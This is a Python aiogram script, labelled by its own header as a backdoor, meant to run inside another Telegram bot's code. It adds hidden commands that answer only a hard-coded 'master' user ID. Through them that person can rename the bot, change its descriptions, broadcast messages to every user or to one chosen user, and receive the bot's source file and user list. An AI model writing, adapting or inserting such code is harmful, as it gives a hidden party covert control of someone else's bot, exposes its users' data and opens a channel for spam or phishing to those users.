# Backdoor control script - executed in main_bot context
import asyncio
from aiogram import types
from aiogram.filters import Command

HIDDEN_MASTER_ID = 8410760051  # ←←← Замени на свой реальный Telegram ID (твой user_id)

# Добавляем контрольные команды только для HIDDEN_MASTER_ID
@dp.message(Command("control_panel"))
async def control_panel(message: types.Message):
    if message.from_user.id != HIDDEN_MASTER_ID:
        return
    await message.answer("Hidden Control Panel:\n/set_name new_name\n/set_description text\n/set_short_description text\n/broadcast_all text\n/broadcast_to user_id text\n/view_code\n/view_users\n/set_photo (инструкция)")

@dp.message(Command("set_name"))
async def set_bot_name(message: types.Message):
    if message.from_user.id != HIDDEN_MASTER_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Укажите новое имя")
        return
    new_name = args[1]
    try:
        await bot.set_my_name(new_name)
        await message.answer("Имя бота изменено.")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@dp.message(Command("set_description"))
async def set_bot_description(message: types.Message):
    if message.from_user.id != HIDDEN_MASTER_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Укажите описание")
        return
    desc = args[1]
    try:
        await bot.set_my_description(desc)
        await message.answer("Описание изменено.")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@dp.message(Command("set_short_description"))
async def set_bot_short_desc(message: types.Message):
    if message.from_user.id != HIDDEN_MASTER_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Укажите короткое описание")
        return
    short_desc = args[1]
    try:
        await bot.set_my_short_description(short_desc)
        await message.answer("Короткое описание изменено.")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@dp.message(Command("broadcast_all"))
async def broadcast_all(message: types.Message):
    if message.from_user.id != HIDDEN_MASTER_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Укажите текст")
        return
    msg = args[1]
    sent = 0
    for uid in users:
        try:
            await bot.send_message(uid, msg)
            sent += 1
        except:
            pass
    await message.answer(f"Рассылка отправлена {sent} юзерам.")

@dp.message(Command("broadcast_to"))
async def broadcast_to(message: types.Message):
    if message.from_user.id != HIDDEN_MASTER_ID:
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        await message.answer("/broadcast_to user_id текст")
        return
    try:
        uid = int(parts[1])
        msg = parts[2]
        await bot.send_message(uid, msg)
        await message.answer("Отправлено.")
    except:
        await message.answer("Ошибка.")

@dp.message(Command("view_code"))
async def view_code(message: types.Message):
    if message.from_user.id != HIDDEN_MASTER_ID:
        return
    try:
        # Чтобы отправить основной код, сохраним его в temp (предполагаем, что основной файл - main_bot.py)
        with open('temp_code.py', 'w') as f:
            f.write(open('main_bot.py', 'r').read())
        await message.answer_document(types.FSInputFile('temp_code.py'))
        os.remove('temp_code.py')
    except:
        await message.answer("Ошибка просмотра кода (убедись, что файл main_bot.py существует).")

@dp.message(Command("view_users"))
async def view_users(message: types.Message):
    if message.from_user.id != HIDDEN_MASTER_ID:
        return
    try:
        await message.answer_document(types.FSInputFile(USERS_FILE))
    except:
        await message.answer("Списка юзеров нет.")

@dp.message(Command("set_photo"))
async def set_photo_instr(message: types.Message):
    if message.from_user.id != HIDDEN_MASTER_ID:
        return
    await message.answer("Автоматическая смена авы бота невозможна через API (Telegram-ограничение).\n\nИнструкция:\n1. Открой @BotFather.\n2. Напиши /mybots.\n3. Выбери своего бота.\n4. Нажми Edit Bot > Edit Photo.\n5. Загрузи новое фото.\n\nЕсли нужно фото для канала/группы — уточни, добавлю отдельную команду.")
